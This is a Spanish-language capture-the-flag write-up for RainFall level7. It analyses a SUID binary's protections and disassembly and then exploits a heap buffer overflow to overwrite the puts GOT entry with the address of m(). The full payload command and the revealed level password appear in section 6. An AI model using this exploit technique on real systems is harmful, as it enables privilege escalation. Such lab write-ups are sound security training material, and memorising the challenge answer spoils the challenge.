# 1. Buscar Binario:

Listamos los archivos para que muestre el binario del `level7` y sus permisos:
```bash
level7@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level7 level7   80 Mar  9  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level7 level7  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level7 level7 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
-rw-r--r--+ 1 level7 level7   65 Sep 23  2015 .pass
-rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile
```
> **Nota:** El bit `s` en los permisos indica que es un binairo **SUID**. Se ejecuta con los privilegios del propietario (`level8`).

---

# 2. Analizamos las protecciones de la RAM

### a). PIE;
```bash
level7@RainFall:~$ file ./level7 
./level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not stripped
```

### b). ASLR:
```bash
level7@RainFall:~$ cat /proc/sys/kernel/randomize_va_space 
0
```

### c). NX y RELRO:
```bash
level7@RainFall:~$ readelf -l ./level7 | grep -E "STACK|RELRO"
GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

### d). STACK CANARY:
```bash
level7@RainFall:~$ nm ./level7 
-bash: /usr/bin/nm: Input/output error
```

### e). `.got` y `.plt`:
```bash
level7@RainFall:~$ readelf -S ./level7 | grep -E ".got|.plt"
  [10] .rel.plt          REL             08048324 000324 000048 08   A  5  12  4
  [12] .plt              PROGBITS        080483a0 0003a0 0000a0 04  AX  0   0 16
  [22] .got              PROGBITS        08049904 000904 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049908 000908 000030 04  WA  0   0  4
```

---

# 3. Resumen del análisis:

| Protección | Estado | Evidencia | Consecuencias |
| --- | --- | --- | --- |
| **PIE** | **OFF** | `executable` | El binario siempre carga en `0x08048000` |
| **ASLR** | **OFF** | `0` | Las direcciones de librerías y stack son constantes. |
| **NX** | **OFF** | `GNU_STACK RWE` | en este reto **no** estamos usando Shellcode. |
| **RELRO** | **OFF** | `No RELRO ` | La tabla GOT puede ser sobrescrita. |
| **CANARY** | **? ? ?**  | `error` | Buscar con `gdb` |
| **.got.plt** | **WA**  | `WA` | Confirma sección `.got` en escritura |

---

# 4. Fuzzing:

1. Si ejecutamos el binario sin argumentos o con un solo argumento nos devuelve `Segmentation fault`. Probamos con 2 arguentos y nos printea el string `~~`:
```bash
level7@RainFall:~$ ./level7 
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 hola
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 hola hola
~~
level7@RainFall:~$
```

2. Probamos a romper el binairo desbordando el buffer y obtenemos un nuevo `Segmentation fault`:
```bash
level7@RainFall:~$ ./level7 asddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd asdddd
Segmentation fault (core dumped)
level7@RainFall:~$
```
---

# 5. Reverse Engineering (Target Identification):

- Desensamblamos el binario:
```asm
...
0x0804852a <+9>:     mov    DWORD PTR [esp],0x8         ; Reserva 8 bytes para struct_01 
0x08048531 <+16>:	 call   0x80483f0 <malloc@plt>      ; Llama a malloc(8)
0x08048536 <+21>:	 mov    DWORD PTR [esp+0x1c],eax    ; Guarda la dirección en el heap
0x0804853a <+25>:	 mov    eax,DWORD PTR [esp+0x1c]
0x0804853e <+29>:	 mov    DWORD PTR [eax],0x1         ; Asigna el valor 1 (t_struct_01->di = 1)
0x08048544 <+35>:	 mov    DWORD PTR [esp],0x8         ; Reserva 8 bytes para buffer_01
0x0804854b <+42>:	 call   0x80483f0 <malloc@plt>      ; Llama a malloc(8) 
0x08048550 <+47>:	 mov    edx,eax
...
...
0x08048559 <+56>:	   mov    DWORD PTR [esp],0x8       ; Reserva 8 bytes para strcut_02
0x08048560 <+63>:	   call   0x80483f0 <malloc@plt>    ; Llama a malloc(8)
0x08048565 <+68>:	   mov    DWORD PTR [esp+0x18],eax
0x08048569 <+72>:	   mov    eax,DWORD PTR [esp+0x18]
0x0804856d <+76>:	   mov    DWORD PTR [eax],0x2       ; Asigan el valor 2 (strucut_02->id = 2)
0x08048573 <+82>:	   mov    DWORD PTR [esp],0x8       ; Reserva 8 bytes para buffer_02
0x0804857a <+89>:	   call   0x80483f0 <malloc@plt>    ; struct_02->buffer = malloc(8)
...
...
0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]      ; Carga argv (char **argv)
0x0804858b <+106>:	add    eax,0x4                      ; Avanza 4 bytes para apuntar a argv[1]
0x0804858e <+109>:	mov    eax,DWORD PTR [eax]          ; Carga argv[1]
...
0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>       ; Copia: strcpy(struct_01->buffer, argv[1])
...
0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]      ; Carga argv
0x080485a8 <+135>:	add    eax,0x8                      ; Suma 8 bytes para apuntar a argv[2]
0x080485ab <+138>:	mov    eax,DWORD PTR [eax]          ; Actualiza eax con la dirección de argv[2]
0x080485ad <+140>:	mov    edx,eax                      ; Guarda en edx la direccion de argv[2]
...
0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>       ; Copia: strcpy(struct_02->buffer, argv[2])
...
0x080485c2 <+161>:	mov    edx,0x80486e9                ; Carga la dirección: 0x80486e9
0x080485c7 <+166>:	mov    eax,0x80486eb                ; Carga la dirección: 0x80486eb
```

- Vemos que en una dirección imprime la string `"r"` y el otra la ruta para leer el password:
```bash
(gdb) x/s 0x80486e9
0x80486e9:	 "r"
(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"
```
```asm
0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx      ; Guarda "r" 2º argumento para fopen()
0x080485d0 <+175>:	mov    DWORD PTR [esp],eax          ; Guarda ruta .pass 1º argumento fcopen()
0x080485d3 <+178>:	call   0x8048430 <fopen@plt>        ; fopen("/home/user/level8/.pass", "r")
...
0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax      ; file = fopen("/home/user/level8/.pass", "r")
0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44     ; Pone 68 el stack segundo argumento de la función `fgets`.
0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960    ; dirección de variable global c
```

- Comprobamos que es así:
```bash
(gdb) x/s 0x8049960
0x8049960 <c>:	 ""
```

```asm
0x080485eb <+202>:	call   0x80483c0 <fgets@plt>        ; fgets(c, 68, file) 
```
- **IMPORTANTE** El password se guarda en la variable global c: `0x8049960`.

```asm
0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703    ; Contiene la string "~~"
0x080485f7 <+214>:	call   0x8048400 <puts@plt>         ; printea "~~"
```
- Buscamos si hay mas funciones en el binario y descubrimos la función `m()`, desemsamblamos y vemos que la función usa `printf()` para printear la variable global que es la que contiene el password:
```bash
(gdb) info functions 
0x080484f4  m                                                  ⟸
0x08048521  main
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:	    push   ebp
   0x080484f5 <+1>:	    mov    ebp,esp
   0x080484f7 <+3>:	    sub    esp,0x18
   0x080484fa <+6>:	    mov    DWORD PTR [esp],0x0
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    edx,0x80486e0
   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960   ⟸  Variable global c
   0x08048517 <+35>:	mov    DWORD PTR [esp],edx
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>          ⟸
   0x0804851f <+43>:	leave  
   0x08048520 <+44>:	ret    
End of assembler dump.
```

Para ver con detalle el analisis consulta el archivo  [asm_analysis.md](https://github.com/4trastos/Rainfall/blob/main/level7/Resources/README.md) en conjunto con el programa de demostración  [source.c](https://github.com/4trastos/Rainfall/blob/main/level7/source.c).

---

# 6. Solución: Heap-based Buffer Overflow

Usar el argv[2] con la direcciñin de la función `m()` (0x080484f4) para que el segundo `strcpy` => strcpy(struct_2->buffer, argv[2]) guarde ahí la dirección de la función `m()` que es la que realmente imprime el password.

Cuando el código llegue a la línea `<+214>`, el programa creerá que está llamando a `puts()`, pero como hemos "hackeao" su dirección en la tabla GOT, saltará a `m()` y nos mostrará el password.
```asm
0x080485f7 <+214>:	call   0x8048400 <puts@plt>         ; printea "~~"
```

1. **Identificamos el BACKDOOR**

```bash
level7@RainFall:~$ objdump -R level7

level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts                 ⟸ 08049928    Sustituir esa dirección de memoria
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```

**2. Cálculo del Offset (20 bytes):**
Para alcanzar el puntero `buffer` de la `struct_02` desde el inicio de `buffer_01`, debemos saltar:

* **8 bytes**: Espacio de datos de `buffer_01`.
* **8 bytes**: Cabecera (Header) del siguiente chunk del heap (metadatos de malloc).
* **4 bytes**: El campo `id` (valor 2) de la `struct_02`.
* **Total**: **20 bytes**. El byte 21 empezará a sobrescribir el puntero `struct_02->buffer`.

3. **Construcción del Payload:**

- **printf 'A%.0s' {1..20}**: Bytes para desbordar el buffer
- **printf "\x28\x99\x04\x08"**: La dirección de memoria que hay que sustituir
- **printf "\xf4\x84\x04\x08"**: argv[2] el programa escriba la dirección de la función m (el "veneno" que meteremos en la GOT).
- **`$(printf 'A%.0s' {1..20}; printf "\x28\x99\x04\x08";) $(printf "\xf4\x84\x04\x08";)`**

### **Ejecución:**
```bash
level7@RainFall:~$ ./level7 $(printf 'A%.0s' {1..20}; printf "\x28\x99\x04\x08";) $(printf "\xf4\x84\x04\x08";)
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
level7@RainFall:~$ su level8
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
level8@RainFall:~$ 
```

# ** 7. Conclusión:**

En el **nivel 7** volvemos a usar la técnica del **Heap-based Buffer Overflow** desbordando el heap en lugar del stack para hacer un **GOT Overwrite**, con la dificulatad de movernos a través de estructutas.

Como el programa usa 4 malloc seguidos podemos desbordarlos facilemente y al no controlar el tamaño en `strcpy` podemos hacer que nos copie el password en la dirección que nosotros queramos.

Hemos cambiado la dirección de `puts` por la de la función `m`.